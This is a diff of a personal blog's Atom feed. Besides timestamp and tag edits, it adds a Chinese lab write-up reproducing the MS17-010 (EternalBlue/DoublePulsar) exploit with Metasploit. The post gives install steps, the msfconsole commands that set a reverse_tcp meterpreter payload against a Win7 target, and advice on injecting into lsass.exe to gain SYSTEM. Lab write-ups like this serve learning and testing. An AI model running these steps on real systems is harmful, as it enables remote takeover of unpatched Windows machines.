@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-08-02T02:59:25.820Z</updated>
+  <updated>2017-08-02T03:09:39.494Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://yoursite.com/2017/08/01/2333333/"/>
     <id>http://yoursite.com/2017/08/01/2333333/</id>
     <published>2017-08-01T06:57:10.000Z</published>
-    <updated>2017-08-02T02:59:25.820Z</updated>
+    <updated>2017-08-02T03:09:39.494Z</updated>
     
     <content type="html"><![CDATA[<p>22332222223332222223322333322333222233322333322<br>22322222222322222222322333322332233223322333322<br>22332222222222222223322333322322333322322333322<br>22333322222222222233333222233322333322322333322<br>22333333222222223333333322333322333322322333322<br>22333333332222333333333322333332233223322333322<br>22333333333223333333333322333333222233332222223 </p>
 <ol>
@@ -39,7 +39,53 @@
       <category term="生活娱乐" scheme="http://yoursite.com/categories/%E7%94%9F%E6%B4%BB%E5%A8%B1%E4%B9%90/"/>
     
     
-      <category term="特殊的表白姿势 666" scheme="http://yoursite.com/tags/%E7%89%B9%E6%AE%8A%E7%9A%84%E8%A1%A8%E7%99%BD%E5%A7%BF%E5%8A%BF-666/"/>
+      <category term="特殊的表白姿势" scheme="http://yoursite.com/tags/%E7%89%B9%E6%AE%8A%E7%9A%84%E8%A1%A8%E7%99%BD%E5%A7%BF%E5%8A%BF/"/>
+    
+      <category term="666" scheme="http://yoursite.com/tags/666/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ms17010-exploit</title>
+    <link href="http://yoursite.com/2017/08/01/ms17010-exploit/"/>
+    <id>http://yoursite.com/2017/08/01/ms17010-exploit/</id>
+    <published>2017-08-01T05:26:26.000Z</published>
+    <updated>2017-08-02T03:10:26.146Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.hi-noob.com/20170427/ms17_010/" title="ms17-010 exp复现" target="_blank" rel="external">原文:http://www.hi-noob.com/20170427/ms17_010</a></p>
+<p>前言</p>
+<p>Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。</p>
+<a id="more"></a> 
+<h1 id="0x00-创建wine"><a href="#0x00-创建wine" class="headerlink" title="0x00 创建wine"></a>0x00 创建wine</h1><p>kali 64位</p>
+<p>kali 64位需要兼容32位环境才可以使用,执行以下命令来安装32位运行库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;dpkg --add-architecture i386</div><div class="line">apt-get update</div><div class="line">apt-get install lib32z1 lib32ncurses5</div><div class="line">apt-get install wine32</div><div class="line">wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
+<p>kali 32位<br>直接执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;wine cmd.exe&apos;</div></pre></td></tr></table></figure></p>
+<p>即可<br><img src="http://op2ihgtv7.bkt.clouddn.com/2.png" alt=""></p>
+<h1 id="0x01修改exp"><a href="#0x01修改exp" class="headerlink" title="0x01修改exp"></a>0x01修改exp</h1><p>下载exp:<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/</a><br>解压文件将其中的deps文件夹和eternalblue_doublepulsar.rb复制到/usr/share/metasploit-framework/modules/exploits/windows/smb/下,我在这里将eternalblue_doublepulsar.rb重命名为ms17_010_smb_RCE.rb,方便以后的查找利用。<br>修改rb文件<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/1.png" alt=""></p>
+<h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><p>攻击机：kali 192.168.1.108</p>
+<p>靶 机：win7 64位 旗舰版 sp1(关闭防火墙)</p>
+<p>MSF使用就很简单了，下面列出主要的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&apos;use exploit/windows/smb/ms17_010_smb_RCE</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.108</div><div class="line">set rhost 192.168.1.107</div><div class="line">set target 9</div><div class="line">set targetarchitecture x64</div><div class="line">exploit&apos;</div></pre></td></tr></table></figure></p>
+<p>附效果图<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/3.jpg" alt=""></p>
+<h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>本人菜鸟，记录的都是很简单的一些东西，大牛绕过就可以了，谢谢，欢迎交流。md语法也是一边百度一边用，可能排版不好，请见谅。</p>
+<p>参考链接：<a href="https://www.t00ls.net/thread-39584-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-39584-1-1.html</a></p>
+<h1 id="纠正"><a href="#纠正" class="headerlink" title="纠正"></a>纠正</h1><p>按照上面的攻击过程获取到的权限一般都是local service \ network service，无法进行提权。问题出现在PROCESSINJECT(注入进程)的设置上。上文中注入的进程是svchost.exe,我们查看进程可以发现svchost.exe有多个进程，分别有local service \ network service \ system三种权限。<br>为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/8.jpg" alt=""></p>
+<p>这也就难怪获得的权限是local service \ network service。<br>我们只需将注入进程修改为system / admin权限的进程就OK，例如explorer.exe、lsass.exe等等。为了以后使用方便，我直接修改文件。<br><img src="http://op2ihgtv7.bkt.clouddn.com/5.png" alt=""></p>
+<p>或者你可以每次利用时set PROCESSINJECT 进程名 设置即可。<br><img src="http://op2ihgtv7.bkt.clouddn.com/6.png" alt=""></p>
+<p>下面是获取到system权限的效果图<br><img src="http://op2ihgtv7.bkt.clouddn.com/7.jpg" alt=""></p>
+<h3 id="最后附一张成功图片"><a href="#最后附一张成功图片" class="headerlink" title="最后附一张成功图片"></a>最后附一张成功图片</h3><p>注：原文set target 9要根据实际msf show options来<br><img src="http://ww1.sinaimg.cn/large/76aacbf5gy1fi46qz6kikj214y0mddh3.jpg" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://www.hi-noob.com/20170427/ms17_010/&quot; title=&quot;ms17-010 exp复现&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文:http://www.hi-noob.com/20170427/ms17_010&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;前言&lt;/p&gt;
+&lt;p&gt;Shadow Brokers公布的文件需要win32位+python2.6+pywin32环境，利用起来有很多设置，略显麻烦，正好t00ls有相关的exp和利用过程，我就写了这篇文章记录我自己的一个复现过程。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="漏洞利用" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+    
+      <category term="ms17-010" scheme="http://yoursite.com/tags/ms17-010/"/>
     
   </entry>
   
@@ -48,7 +94,7 @@
     <link href="http://yoursite.com/2017/08/01/win7sp1-apache/"/>
     <id>http://yoursite.com/2017/08/01/win7sp1-apache/</id>
     <published>2017-08-01T04:58:22.000Z</published>
-    <updated>2017-08-02T03:02:23.827Z</updated>
+    <updated>2017-08-02T03:09:25.494Z</updated>
     
     <content type="html"><![CDATA[<p>本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。</p>
 <a id="more"></a> 
@@ -81,7 +127,9 @@ Win+R运行cmd
       <category term="系统环境" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
     
     
-      <category term="win7 走过的坑" scheme="http://yoursite.com/tags/win7-%E8%B5%B0%E8%BF%87%E7%9A%84%E5%9D%91/"/>
+      <category term="win7" scheme="http://yoursite.com/tags/win7/"/>
+    
+      <category term="走过的坑" scheme="http://yoursite.com/tags/%E8%B5%B0%E8%BF%87%E7%9A%84%E5%9D%91/"/>
     
   </entry>
   
@@ -90,7 +138,7 @@ Win+R运行cmd
     <link href="http://yoursite.com/2017/08/01/oh-my-zsh/"/>
     <id>http://yoursite.com/2017/08/01/oh-my-zsh/</id>
     <published>2017-08-01T03:51:11.000Z</published>
-    <updated>2017-08-02T03:01:37.246Z</updated>
+    <updated>2017-08-02T03:09:17.627Z</updated>
     
     <content type="html"><![CDATA[<h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><p>如果你用 Mac，就可以直接看下一节<br>如果你用 Redhat Linux，执行：sudo yum install zsh<br>如果你用 Ubuntu Linux，执行：sudo apt-get install zsh<br>如果你用 Windows……去洗洗睡吧。</p>
 <a id="more"></a> 
@@ -143,7 +191,11 @@ Win+R运行cmd
       <category term="系统环境" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
     
     
-      <category term="oh-my-zsh mac,linux shell" scheme="http://yoursite.com/tags/oh-my-zsh-mac-linux-shell/"/>
+      <category term="oh-my-zsh" scheme="http://yoursite.com/tags/oh-my-zsh/"/>
+    
+      <category term="mac,linux" scheme="http://yoursite.com/tags/mac-linux/"/>
+    
+      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
     
   </entry>
   
